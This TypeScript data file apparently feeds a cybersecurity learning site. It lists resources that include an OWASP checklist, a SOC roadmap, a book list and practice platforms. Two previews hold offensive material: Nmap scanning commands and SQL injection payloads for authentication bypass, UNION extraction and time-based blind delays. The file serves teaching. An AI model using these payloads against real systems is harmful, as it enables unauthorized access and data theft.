import { ResourceItem } from '../types';

export const RESOURCES: ResourceItem[] = [
  {
    id: 'res-nmap-cheat',
    title: 'Nmap Offensive Scanning & Scripting Cheat Sheet',
    category: 'Cheat Sheets',
    type: 'PDF / Markdown Guide',
    description: 'Comprehensive syntax guide covering TCP/UDP flags, timing templates, NSE script categories, and firewall evasion techniques.',
    format: 'Markdown + CLI Reference',
    badge: 'Essential',
    internalDataPreview: `# Nmap Cheat Sheet Quick Reference
nmap -sS -sV -sC -T4 target.com     # Fast discovery with default scripts
nmap -p- --min-rate 1000 target.com # Scan all 65,535 ports rapidly
nmap --script "vuln" target.com     # Run all non-intrusive vulnerability scripts
nmap -sU -top-ports 100 target.com  # UDP top 100 ports scan`
  },
  {
    id: 'res-owasp-top-10',
    title: 'OWASP Top 10 (2021) Defensive Audit Checklist',
    category: 'Security Checklists',
    type: 'Interactive Checklist',
    description: 'Practical audit checklist covering Broken Access Control, Cryptographic Failures, Injection, Insecure Design, and Security Misconfigurations.',
    format: 'Interactive Table',
    badge: 'Industry Standard',
    internalDataPreview: `[ ] A01:2021 Broken Access Control - Enforce authorization on all API routes
[ ] A02:2021 Cryptographic Failures - Enforce TLS 1.3, disable weak ciphers, hash passwords with Argon2/Bcrypt
[ ] A03:2021 Injection - Use parameterized prepared statements exclusively
[ ] A04:2021 Insecure Design - Implement threat modeling prior to feature development
[ ] A05:2021 Security Misconfiguration - Remove default credentials, disable directory listings`
  },
  {
    id: 'res-soc-analyst-roadmap',
    title: 'Blue Team & SOC Tier-1 Career Roadmap (2026)',
    category: 'Learning Roadmaps',
    type: 'Structured Curriculum Roadmap',
    description: 'Step-by-step pathway from networking and Windows/Linux sysadmin foundations to SIEM alert triage, Sysmon hunting, and incident containment.',
    format: 'Visual Stage Roadmap',
    badge: 'Career Blueprint',
    internalDataPreview: `Stage 1: Networking & Systems (TCP/IP, Wireshark, Linux CLI, Active Directory)
Stage 2: Defensive Telemetry (Windows Event Logs, Sysmon, auditd, Suricata IDS)
Stage 3: SIEM & XDR (Wazuh, Elastic, Splunk, Alert Triage, False-Positive Tuning)
Stage 4: Incident Response & Frameworks (MITRE ATT&CK, NIST SP 800-61, Containment)`
  },
  {
    id: 'res-sql-injection-cheat',
    title: 'SQL Injection Exploitation & Filter Bypass Cheat Sheet',
    category: 'Cheat Sheets',
    type: 'Markdown / Reference',
    description: 'Payload references for MySQL, PostgreSQL, MSSQL, and Oracle, covering UNION queries, error payloads, and time delays.',
    format: 'Payload Reference',
    badge: 'Offensive',
    internalDataPreview: `-- MySQL Authentication Bypass
admin' -- -
admin' #
' or 1=1 limit 1 -- -

-- Extract Database Version
' UNION SELECT 1, @@version, 3-- -

-- Time-based Blind Delay
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -`
  },
  {
    id: 'res-books-cybersecurity',
    title: 'Curated Cybersecurity Technical Book Recommendations',
    category: 'Cybersecurity Books',
    type: 'Reading List',
    description: 'Handpicked master-level books covering web security, network protocols, malware analysis, and practical ethical hacking.',
    format: 'Curated Bibliography',
    badge: 'Recommended',
    internalDataPreview: `1. The Web Application Hacker's Handbook (Dafydd Stuttard & Marcus Pinto)
2. Practical Malware Analysis (Michael Sikorski & Andrew Honig)
3. Windows Internals (Pavel Yosifovich, Mark Russinovich, David Solomon)
4. Network Security Assessment (Chris McNab)
5. Blue Team Handbook: Incident Response Edition (Don Murdoch)`
  },
  {
    id: 'res-practice-platforms',
    title: 'Top Hands-on Cyber Range & Practice Platforms',
    category: 'Practice Platforms',
    type: 'Platform Directory',
    description: 'Curated platforms for legal penetration testing, CTF training, blue team defense, and real-world vulnerability scenarios.',
    format: 'Resource Directory',
    badge: 'Free & Freemium',
    internalDataPreview: `• PortSwigger Web Security Academy: World's best free web app security labs
• TryHackMe: Structured beginner-friendly guided cyber pathways
• Hack The Box: Realistic enterprise offensive and defensive machines
• Blue Team Labs Online: Practical defensive investigation & packet challenges
• OverTheWire Bandit: Fundamental Linux terminal and privilege training`
  }
];
